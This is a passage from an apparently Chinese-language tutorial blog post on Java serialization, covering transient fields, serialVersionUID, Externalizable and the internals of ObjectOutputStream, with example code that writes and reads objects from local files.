class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyList</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    transient 表示该成员 arr 不需要被序列化</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">transient</span> Object[] arr;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyList</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyList</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.arr = <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">100</span>];</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        给前面30个元素进行初始化</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">30</span>; i++) &#123;</span><br><span class="line">            <span class="built_in">this</span>.arr[i] = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;MyList&#123;&quot;</span> + <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> + <span class="string">&quot;, arr=&quot;</span> + Arrays.toString(arr) + <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//-------------------------- 自定义序列化反序列化 arr 元素 ------------------</span></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Save the state of the &lt;tt&gt;ArrayList&lt;/tt&gt; instance to a stream (that</span></span><br><span class="line"><span class="comment">     * is, serialize it).</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@serialData</span> The length of the array backing the &lt;tt&gt;ArrayList&lt;/tt&gt;</span></span><br><span class="line"><span class="comment">     * instance is emitted (int), followed by all of its elements</span></span><br><span class="line"><span class="comment">     * (each an &lt;tt&gt;Object&lt;/tt&gt;) in the proper order.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(java.io.ObjectOutputStream s)</span> <span class="keyword">throws</span> java.io.IOException &#123;</span><br><span class="line">        <span class="comment">//执行 JVM 默认的序列化操作</span></span><br><span class="line">        s.defaultWriteObject();</span><br><span class="line">        <span class="comment">//手动序列化arr数组前面30个元素</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">30</span>; i++) &#123;</span><br><span class="line">            s.writeObject(arr[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Reconstitute the &lt;tt&gt;ArrayList&lt;/tt&gt; instance from a stream (that is,</span></span><br><span class="line"><span class="comment">     * deserialize it).</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span> <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">//执行 JVM 默认的序列化操作</span></span><br><span class="line">        s.defaultReadObject();</span><br><span class="line">        arr = <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">30</span>];</span><br><span class="line">        <span class="comment">//手动反序列化arr数组前30个元素</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">30</span>; i++) &#123;</span><br><span class="line">            arr[i] = s.readObject();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TransientMain</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">FILE_PATH</span> <span class="operator">=</span> <span class="string">&quot;./transient.bin&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        serializeMyList();</span><br><span class="line">        deserializeMyList();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serializeMyList</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;序列化...&quot;</span>);</span><br><span class="line">        <span class="type">MyList</span> <span class="variable">myList</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyList</span>(<span class="string">&quot;ArrayList&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(FILE_PATH));</span><br><span class="line">        oos.writeObject(myList);</span><br><span class="line">        oos.flush();</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    1.如果 private Object[] arr; 没有使用 transient ，那么整个数组都会被保存，而不是保存实际存储的数据</span></span><br><span class="line"><span class="comment">    输出结果：MyList&#123;name=&#x27;ArrayList&#x27;, arr=[0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null]&#125;</span></span><br><span class="line"><span class="comment">    2.private transient Object[] arr;设置了 transient，表示 arr 元素不进行序列化</span></span><br><span class="line"><span class="comment">    输出结果：MyList&#123;name=&#x27;ArrayList&#x27;, arr=null&#125;</span></span><br><span class="line"><span class="comment">    3.参考 ArrayList 处理内部的 transient Object[] elementData; 数组是通过 writeObject 和 readObject 实现的</span></span><br><span class="line"><span class="comment">    我们的 MyList 内部也可以借鉴这种方式实现transient元素的手动序列化和反序列化。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deserializeMyList</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;反序列化...&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(FILE_PATH));</span><br><span class="line">        <span class="type">MyList</span> <span class="variable">myList</span> <span class="operator">=</span> (MyList) ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        System.out.println(myList);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>6.Serializable 在序列化和反序列化过程中大量使用了反射，因此其过程会产生的大量的内存碎片</strong></p><p>serialVersionUID与兼容性问题</p><h2 id="序列化ID"><a href="#序列化ID" class="headerlink" title="序列化ID"></a>序列化ID</h2><p>在上面进行序列化时，加了一个serialVersionUID字段，这便是序列化ID</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br></pre></td></tr></table></figure><p>这个序列化ID起着关键的作用，它决定着是否能够成功反序列化，java的序列化机制是通过判断运行时类的serialVersionUID来验证版本一致性的，在进行反序列化时，JVM会把传进来的字节流中的serialVersionUID与本地实体类中的serialVersionUID进行比较，如果相同则认为是一致的，便可以进行反序列化，否则就会报序列化版本不一致的异常，即序列化ID是为了保证成功进行反序列化</p><h3 id="生成serialVersionUID"><a href="#生成serialVersionUID" class="headerlink" title="生成serialVersionUID"></a>生成serialVersionUID</h3><p>可以用idea里的插件GenerateSerialVersionUID生成序列化ID</p><p><img src="https://img.picui.cn/free/2024/06/03/665dc5dc3b151.png" alt="屏幕截图 2024-05-08 223202.png"></p><p>右键生成里面就有</p><p><img src="https://img.picui.cn/free/2024/06/03/665dc5dc53a0a.png" alt="image-20240508223946470.png"></p><h3 id="serialVersionUID-的兼容性问题"><a href="#serialVersionUID-的兼容性问题" class="headerlink" title="serialVersionUID 的兼容性问题"></a>serialVersionUID 的兼容性问题</h3><p>检测到 serialVersionUID 不一致就会导致兼容问题异常</p><p>serialVersionUID 发生改变有三种情况：</p><ol><li>手动去修改导致当前的 serialVersionUID 与序列化前的不一样。</li><li>我们根本就没有手动去写这个 serialVersionUID 常量，那么 JVM 内部会根据类结构去计算得到这个 serialVersionUID 值，在类结构发生改变时(属性增加，删除或者类型修改了)这种也是会导致 serialVersionUID 发生变化。</li><li>假如类结构没有发生改变，并且没有定义 serialVersionUID ，但是反序列和序列化操作的虚拟机不一样也可能导致计算出来的 serialVersionUID 不一样。</li></ol><h3 id="默认的序列化ID"><a href="#默认的序列化ID" class="headerlink" title="默认的序列化ID"></a>默认的序列化ID</h3><p>当我们一个实体类中没有显式的定义一个名为“serialVersionUID”、类型为long的变量时，Java序列化机制会根据编译时的class自动生成一个serialVersionUID作为序列化版本比较，这种情况下，<strong>只有同一次编译生成的class才会生成相同的serialVersionUID</strong>。例如我们后续在该类添加其他字段，就会出现serialVersionUID不一致，导致反序列化失败。针对这个问题，我们可以在本地类中添加一个“serialVersionUID”变量，值保持不变，便可以进行序列化和反序列化</p><h2 id="Externalizable-接口"><a href="#Externalizable-接口" class="headerlink" title="Externalizable 接口"></a>Externalizable 接口</h2><p>Serializable 接口内部序列化是 JVM 自动实现的，如果我们想自定义序列化过程，就可以使用以上这个接口来实现，它内部提供两个接口方法：</p><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Externalizable</span> <span class="keyword">extends</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">  <span class="comment">//将要序列化的对象属性通过 var1.writeXxx() 写入到序列化流中</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">writeExternal</span><span class="params">(ObjectOutput var1)</span> <span class="keyword">throws</span> IOException</span>;</span><br><span class="line"><span class="comment">//将要反序列化的对象属性通过 var1.readXxx() 读出来</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">readExternal</span><span class="params">(ObjectInput var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Externalizable 的使用</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title">Person</span> <span class="title">implements</span> <span class="title">Externalizable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> final <span class="built_in">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">int</span> age;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    实现Externalizable这个接口需要提供无参构造，在反序列化时会检测</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span>()</span> &#123;</span><br><span class="line">        System.<span class="keyword">out</span>.println(<span class="string">&quot;Person: empty&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span>(<span class="params">String name, <span class="built_in">int</span> age</span>)</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    @Override</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">writeExternal</span>(<span class="params">ObjectOutput <span class="keyword">out</span></span>) throws IOException</span> &#123;<span class="comment">//ObjectOutput接口扩展了DataOutput接口,并包含了将对象写入输出流的方法</span></span><br><span class="line">        System.<span class="keyword">out</span>.println(<span class="string">&quot;person writeExternal...&quot;</span>);</span><br><span class="line">        <span class="keyword">out</span>.writeObject(name);<span class="comment">//name是String 类型</span></span><br><span class="line">        <span class="keyword">out</span>.writeInt(age);</span><br><span class="line">    &#125;</span><br><span class="line">    @Override</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">readExternal</span>(<span class="params">ObjectInput <span class="keyword">in</span></span>) throws ClassNotFoundException, IOException</span> &#123;</span><br><span class="line">        System.<span class="keyword">out</span>.println(<span class="string">&quot;person readExternal...&quot;</span>);</span><br><span class="line"></span><br><span class="line">        name = (String) <span class="keyword">in</span>.readObject();<span class="comment">//readObject方法返回的是Object类型,所以需要显式地进行类型转换(String)</span></span><br><span class="line">        age = <span class="keyword">in</span>.readInt();</span><br><span class="line">    &#125;</span><br><span class="line">    @Override</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span>()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span> + <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> + <span class="string">&quot;, age=&quot;</span> + age + <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试 Person 对象的序列化和反序列化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Externalizabletest</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">FILE_PATH</span> <span class="operator">=</span> <span class="string">&quot;../person.bin&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;zhangsan&quot;</span>, <span class="number">15</span>);</span><br><span class="line">        System.out.println(person.toString());</span><br><span class="line">        serializable(person, FILE_PATH);</span><br><span class="line">        System.out.println(<span class="string">&quot;============反序列化=============&quot;</span>);</span><br><span class="line">        person = (Person) deserializable(FILE_PATH);</span><br><span class="line">        System.out.println(person.toString());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serializable</span><span class="params">(Object o, String path)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">boas</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(path);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(boas);</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        oos.close();</span><br><span class="line">        boas.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Object <span class="title function_">deserializable</span><span class="params">(String path)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(path));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> bis.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Java-的序列化步骤与数据结构分析"><a href="#Java-的序列化步骤与数据结构分析" class="headerlink" title="Java 的序列化步骤与数据结构分析"></a>Java 的序列化步骤与数据结构分析</h2><p>序列化算法一般会按步骤做如下事情：</p><p>将对象实例相关的类元数据输出。<br>递归地输出类的超类描述直到不再有超类。<br>类元数据完了以后，开始从最顶层的超类开始输出对象实例的实际数据值。<br>从上至下递归输出实例的数据</p><h3 id="writeObject-原理分析"><a href="#writeObject-原理分析" class="headerlink" title="writeObject 原理分析"></a>writeObject 原理分析</h3><h5 id="ObjectOutputStream-构造函数"><a href="#ObjectOutputStream-构造函数" class="headerlink" title="ObjectOutputStream 构造函数"></a>ObjectOutputStream 构造函数</h5><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ObjectOutputStream</span>(<span class="params">OutputStream <span class="keyword">out</span></span>) throws IOException</span> &#123;</span><br><span class="line">    verifySubclass();</span><br><span class="line">    bout = <span class="keyword">new</span> BlockDataOutputStream(<span class="keyword">out</span>);<span class="comment">//①</span></span><br><span class="line">    handles = <span class="keyword">new</span> HandleTable(<span class="number">10</span>, (<span class="built_in">float</span>) <span class="number">3.00</span>);</span><br><span class="line">    subs = <span class="keyword">new</span> ReplaceTable(<span class="number">10</span>, (<span class="built_in">float</span>) <span class="number">3.00</span>);</span><br><span class="line">    enableOverride = <span class="literal">false</span>;<span class="comment">//②</span></span><br><span class="line">    writeStreamHeader();<span class="comment">//③</span></span><br><span class="line">    bout.setBlockDataMode(<span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">if</span> (extendedDebugInfo) &#123;</span><br><span class="line">        debugInfoStack = <span class="keyword">new</span> DebugTraceInfoStack();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        debugInfoStack = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>①bout：用于写入一些类元数据还有对象中基本数据类型的值，在下面会分析。</p><p>②enableOverride ：false 表示不支持重写序列化过程，如果为 true ，那么需要重写 writeObjectOverride 方法。这个一般不用管它。</p><p>③writeStreamHeader() 写入头信息，具体看下面分析。</p><h5 id="ObjectOutputStream-writeStreamHeader"><a href="#ObjectOutputStream-writeStreamHeader" class="headerlink" title="ObjectOutputStream#writeStreamHeader()"></a>ObjectOutputStream#writeStreamHeader()</h5><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">void</span> <span class="title">writeStreamHeader</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    bout.writeShort(STREAM_MAGIC);<span class="comment">//①</span></span><br><span class="line">    bout.writeShort(STREAM_VERSION);<span class="comment">//②</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>①STREAM_MAGIC 声明使用了序列化协议，bout 就是一个流，将对应的头数据写入该流中</p><p>②STREAM_VERSION 指定序列化协议版本</p><h5 id="ObjectOUtStream-writeObject-obj"><a href="#ObjectOUtStream-writeObject-obj" class="headerlink" title="ObjectOUtStream#writeObject(obj)"></a>ObjectOUtStream#writeObject(obj)</h5><p>这是自定义的序列化过程</p><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="function"><span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (enableOverride) &#123;<span class="comment">//一般不会走这里，因为在 ObjectOutputStream 构造设置为 false 了</span></span><br><span class="line">        writeObjectOverride(obj);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;<span class="comment">//代码会执行这里</span></span><br><span class="line">        writeObject0(obj, <span class="keyword">false</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException ex) &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="ObjectOutStream-writeObject0"><a href="#ObjectOutStream-writeObject0" class="headerlink" title="ObjectOutStream#writeObject0()"></a>ObjectOutStream#writeObject0()</h5><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">void</span> <span class="title">writeObject0</span><span class="params">(Object obj, <span class="keyword">boolean</span> unshared)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">     </span><br><span class="line">        Object orig = obj;</span><br><span class="line">        Class&lt;?&gt; cl = obj.getClass();</span><br><span class="line">        ObjectStreamClass desc;</span><br><span class="line">       </span><br><span class="line">        <span class="comment">//①</span></span><br><span class="line">        desc = ObjectStreamClass.lookup(cl, <span class="keyword">true</span>);</span><br><span class="line">        ...</span><br><span class="line">        <span class="comment">//②</span></span><br><span class="line">        <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> Class) &#123;</span><br><span class="line">            writeClass((Class) obj, unshared);</span><br><span class="line">        &#125; <span class="function"><span class="keyword">else</span> <span class="title">if</span> <span class="params">(obj <span class="keyword">instanceof</span> ObjectStreamClass)</span> </span>&#123;</span><br><span class="line">            writeClassDesc((ObjectStreamClass) obj, unshared);</span><br><span class="line">        <span class="comment">// END Android-changed:  Make Class and ObjectStreamClass replaceable.</span></span><br><span class="line">        &#125; <span class="function"><span class="keyword">else</span> <span class="title">if</span> <span class="params">(obj <span class="keyword">instanceof</span> String)</span> </span>&#123;</span><br><span class="line">            writeString((String) obj, unshared);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cl.isArray()) &#123;</span><br><span class="line">            writeArray(obj, desc, unshared);</span><br><span class="line">        &#125; <span class="function"><span class="keyword">else</span> <span class="title">if</span> <span class="params">(obj <span class="keyword">instanceof</span> Enum)</span> </span>&#123;</span><br><span class="line">            writeEnum((Enum&lt;?&gt;) obj, desc, unshared);</span><br><span class="line">        &#125; <span class="function"><span class="keyword">else</span> <span class="title">if</span> <span class="params">(obj <span class="keyword">instanceof</span> Serializable)</span> </span>&#123;</span><br><span class="line">            writeOrdinaryObject(obj, desc, unshared);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//③</span></span><br><span class="line">            <span class="keyword">if</span> (extendedDebugInfo) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> NotSerializableException(</span><br><span class="line">                    cl.getName() + <span class="string">&quot;\n&quot;</span> + debugInfoStack.toString());</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> NotSerializableException(cl.getName());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>① lookup 函数用于查找当前类的 ObjectStreamClass ，它是用于描述一个类的结构信息的，通过它就可以获取对象及其对象属性的相关信息，并且它内部持有该对象的父类的 ObjectStreamClass 实例。其内部大量使用了反射，以下是他的构造函数</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">private ObjectStreamClass(final <span class="keyword">Class</span>&lt;?&gt; <span class="keyword">cl</span>) &#123;</span><br><span class="line">    this.<span class="keyword">cl</span> = <span class="keyword">cl</span>;</span><br><span class="line">    name = <span class="keyword">cl</span>.getName();</span><br><span class="line">    isProxy = Proxy.isProxyClass(<span class="keyword">cl</span>);</span><br><span class="line">    isEnum = Enum.<span class="keyword">class</span>.isAssignableFrom(<span class="keyword">cl</span>);</span><br><span class="line">    serializable = Serializable.<span class="keyword">class</span>.isAssignableFrom(<span class="keyword">cl</span>);</span><br><span class="line">    externalizable = Externalizable.<span class="keyword">class</span>.isAssignableFrom(<span class="keyword">cl</span>);</span><br><span class="line">    <span class="keyword">Class</span>&lt;?&gt; superCl = <span class="keyword">cl</span>.getSuperclass();</span><br><span class="line">  <span class="comment">//superDesc 表示需要序列化对象的父类的 ObjectStreamClass，如果为空，则调用 lookUp 查找</span></span><br><span class="line">    superDesc = (superCl != null) ? <span class="keyword">lookup</span>(superCl, false) : null;</span><br><span class="line"><span class="comment">//localDesc 表示自己</span></span><br><span class="line">    localDesc = this;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>② 